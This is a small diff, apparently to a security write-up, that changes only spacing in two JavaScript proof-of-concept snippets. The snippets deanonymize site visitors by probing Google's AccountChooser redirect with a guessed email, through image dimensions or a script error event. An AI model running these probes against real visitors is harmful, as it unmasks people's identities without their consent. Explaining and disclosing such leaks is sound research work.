@@ -25,7 +25,7 @@ Now, we have an endpoint that points to an image resource when the email address
     var endpoint = 'https://accounts.google.com/AccountChooser?continue=https://www.google.com/images/errors/robot.png&email=';
     var img = new Image();
     img.src = endpoint + email;
-    window.onload = function() {
+    window.onload = function () {
         if (img.height === 213 && img.width === 171) {
             alert('Deanonymized successfully!');
         }
@@ -45,7 +45,7 @@ What happens if we simply use an endpoint that points to a non-existent resource
     var endpoint = 'https://accounts.google.com/AccountChooser?continue=https://www.google.com/404&email=';
     var script = document.createElement('script');
     script.src = endpoint + email;
-    script.onerror = function() {
+    script.onerror = function () {
         alert('Deanonymized successfully!');
     };
     document.documentElement.appendChild(script);
